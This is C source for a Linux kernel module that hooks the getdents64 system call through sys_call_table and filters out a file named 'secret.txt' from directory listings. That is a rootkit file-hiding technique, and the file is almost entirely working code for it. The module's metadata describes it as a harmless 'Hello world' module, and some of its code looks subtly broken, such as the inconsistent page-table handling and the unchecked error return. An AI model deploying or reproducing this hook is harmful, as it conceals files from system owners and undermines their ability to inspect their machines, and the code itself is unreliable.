#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#define FILE_NAME_TO_HIDE "secret.txt"
unsigned long *sys_call_table;
asmlinkage long unsigned int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    int rtn;
    struct linux_dirent64 *cur = dirp;
    int i =0;
    //using the real syscall for getting the info
    rtn = org_getdents64(fd, dirp, count);
    while (i < rtn)
    {
        //######
        /*inside the loop we running through the
         struct that was return from the real getdents, then we take everyfile name using the 
         linux_dirent64 cur whish is assigend by dirp that is the linux_dirent64 struct of the 
         file we recive from getdents, we take his struct member d_name (which contain the file name) 
         and then we compre it to the file name that we want to hide. if thier equal we get rid with that 
         (explain later how) and then contiune*/


        // in strcmp return 0 means strings are equal
        if (strncmp(cur->d_name, FILE_NAME_TO_HIDE, strlen(FILE_NAME_TO_HIDE)) == 0)
        {    
                 
            printk(KERN_ALERT "found it!"); 
            int reclen;
            char *next_rec;                                                 
            //get rid of our file form the syscall
            reclen = cur->d_reclen; // getting the size of the dirent
            next_rec = (char *)cur + reclen; //create a char * that will point to the next place in the buffer of dirs   
            int len = (uintptr_t)dirp + rtn - (uintptr_t) next_rec; // calculte the len of this char * inside the struct
            memmove(cur, next_rec, len);//copy it to the cur
            rtn-=reclen; //remove the size of reclen from rtn because we want to get rid of it
            continue;
        }
        i+=cur->d_reclen;
        cur = (struct linux_dirent64*) ((char *)dirp +i);//update cur
    }
    return rtn;
}
int set_page_write(unsigned long *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(*addr, &level);
    if (pte->pte &~ _PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        return 1;
    }
    return 0;
}
void set_page_no_write(unsigned long *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}
int replace_getdents_syscall(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    if (sys_call_table != 0)
    {
        if (set_page_write(sys_call_table))
        {
            org_getdents64 = (long unsigned int (*)(unsigned int,  struct linux_dirent64 *, unsigned int))sys_call_table[__NR_getdents64];
            sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
            set_page_no_write(sys_call_table);
            return 1;
        }
        return -1;

    }
    return -1;

}
void remove_hook(void)
{
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    if (sys_call_table != 0)
     if (set_page_write(sys_call_table))
        {
            sys_call_table[__NR_getdents64] = (unsigned long int)org_getdents64;
            set_page_no_write(sys_call_table);
            printk(KERN_ALERT "hook removed");
            return ;
        }
}
static int __init getdents_hook_init(void)
{
    if (!replace_getdents_syscall())
    {  
        printk(KERN_ALERT "error, couldent replace the getdents64");
        return -1;
    }
    return 1;
}
static void __exit unload(void)
{
    remove_hook();
}
module_init(getdents_hook_init);
module_exit(unload);

MODULE_AUTHOR("Akshat Sinha"); 
MODULE_DESCRIPTION("A simple Hello world LKM!"); 
MODULE_LICENSE("GPL"); 
MODULE_VERSION("0.1"); 